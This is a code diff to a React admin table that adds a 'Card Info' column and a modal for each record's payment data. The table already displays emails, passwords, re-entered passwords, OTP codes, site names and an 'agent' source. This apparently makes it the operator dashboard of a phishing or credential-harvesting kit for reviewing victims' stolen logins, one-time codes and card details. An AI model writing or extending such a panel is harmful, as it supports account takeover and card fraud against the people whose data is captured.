@@ -4,8 +4,12 @@ import { handleCopyClick } from "../../utils/copyToClipboard";
 import Loader from "../../common/Loader";
 import useInformation from "../../hooks/useInformation";
 import {  PaginationNav1Presentation } from "../Pagination/Pagination";
+import CardDataModal from "../../modals/CardDataModal";
+import { useEffect, useState } from "react";
 
 const InformationTable = () => {
+  const [open,setOpen] = useState(false)
+
 
   const { loading, setIsRefresh, displayInfo, role,totalPages, setPage,page} = useInformation()
 
@@ -60,6 +64,9 @@ const InformationTable = () => {
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 OTP Code
               </th>
+              <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+               Card Info
+              </th>
 
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 Agent
@@ -76,7 +83,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user,  createdAt, agent: { source }, status, email, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user,  createdAt, agent: { source }, status, email, password, repassword, otp, siteName, _id,paymentInfo }:any, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -113,7 +120,18 @@ const InformationTable = () => {
 
 
                   </td>
+                  <td  className="px-2 py-1 font-bold cursor-pointer ">
+                  <div className="relative inline-block">
+                      <button
+                        className={`p-2  ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                          }`}
+                          onClick={()=> (setOpen(state => !state))}
+                          >View</button>
 
+                    </div>
+
+
+                  </td>
 
 
                   <td className="px-2 py-1 font-bold cursor-pointer ">
@@ -127,6 +145,7 @@ const InformationTable = () => {
                   <td onClick={() => handleCopyClick(formatUtcToLocal(createdAt))} className="px-2 py-1 font-bold cursor-pointer">
                     {formatUtcToLocal(createdAt)}
                   </td>
+                  <CardDataModal isOpen={open} setIsOpen={setOpen} data={paymentInfo}/>
                 </tr>
 
               ))
@@ -138,6 +157,7 @@ const InformationTable = () => {
 
 
           </tbody>
+         
         </table>
 <div className="flex items-center justify-center">
 <PaginationNav1Presentation 
